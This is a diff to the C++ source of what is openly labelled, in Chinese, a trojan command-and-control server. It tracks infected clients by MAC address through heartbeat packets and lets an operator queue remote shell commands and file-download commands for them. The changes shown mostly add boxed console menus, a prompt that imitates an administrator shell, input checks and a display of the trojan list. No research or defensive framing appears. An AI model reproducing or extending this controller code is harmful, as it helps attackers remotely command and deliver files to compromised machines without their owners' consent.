@@ -163,21 +163,31 @@ DWORD WINAPI InputThread(LPVOID lpParameter)
 		if (free_index != -1)
 		{
 			g_trojan_info[free_index].live_flag = 1;
-			cout << "请输入要发送的指令种类：" << endl << "1.普通指令 2.文件下载指令" << endl << "(1/2)  ";
+			cout << "                                            *---------------------------*" << endl;
+			cout << "                                            |  请输入要发送的指令种类： |" << endl;
+			cout << "                                            |        1.普通指令         |" << endl;
+			cout << "                                            |      2.文件下载指令       |" << endl;
+			cout << "                                            *---------------------------*" << endl;
+			cout << "                                            >>>  ";
 			cin >> kind;
 			if (kind == 1)
 			{
 				g_trojan_info[free_index].cmd_no = CMD_CMD;
 			}
-			if (kind == 2)
+			else if (kind == 2)
 			{
 				g_trojan_info[free_index].cmd_no = CMD_DOWNLOAD;
 			}
-			cout << "输入要发送的指令：";
+			else
+			{
+				cout << "检测到用户恶意输入！此次不会发送指令！" << endl;
+				continue;
+			}
+			cout << "C:\\Users\\Administrator>";
 			cin >> g_trojan_info[free_index].cmd;
 		}
 		else { cout << "客户端mac地址错误！"; }
-
+		cout << "指令已保存！等待木马连接服务器..." << endl;
 		Sleep(1000);
 		
 	}
@@ -203,7 +213,7 @@ DWORD WINAPI ClientThread(LPVOID lpParameter)
 	{
 		memset(RecvBuffer, 0, MAX_PATH);
 		Ret = recvn(ClientSocket, RecvBuffer, MAC_ADDR_LEN);
-		cout << "\n--------------------------------\n连接到木马！mac地址为"<<RecvBuffer << endl;
+		cout << "\n--------------------------------\n收到mac地址为" << RecvBuffer<<"的心跳包" << endl;
 
 		if ( Ret != MAC_ADDR_LEN ) 
 		{
@@ -213,10 +223,18 @@ DWORD WINAPI ClientThread(LPVOID lpParameter)
 		}
 		
 		if(bFirst){
-			cout << "添加到木马列表" << endl;
 			remove_trojan_from_list(RecvBuffer);
 			add_trojan_to_list(RecvBuffer);
 			bFirst = false;
+			cout << "                                               *---------------------*" << endl;
+			cout << "                                               |  木马列表已更新     |" << endl;
+			cout << "                                               |  列表包含"<< now_client_num <<"个木马    |" << endl;
+		for (int i = 0; i < now_client_num; i++)
+		{
+			cout << "                                               |  "<< g_trojan_info[i].mac <<"  |"<< endl;
+		}
+			cout << "                                               *---------------------*" << endl;
+
 		}
 
 		//cmd(RecvBuffer);
@@ -374,7 +392,11 @@ int main(int argc, char* argv[])
 		return -1;
 	}
 
-	cout<<"服务端已经启动"<<endl;
+	cout << endl << "                                               *----------------------*" << endl;
+	cout << "                                               |  成功启动服务端      |" << endl;
+	cout << "                                               |  IP地址  ：" << inet_ntoa(LocalAddr.sin_addr) << "   |" << endl;
+	cout << "                                               |  端口地址：" << ntohs(LocalAddr.sin_port) << "      |" << endl;
+	cout << "                                               *----------------------*" << endl;
 
 
 	inThread = CreateThread(NULL, 0, InputThread, (LPVOID)ServerSocket, 0, NULL);
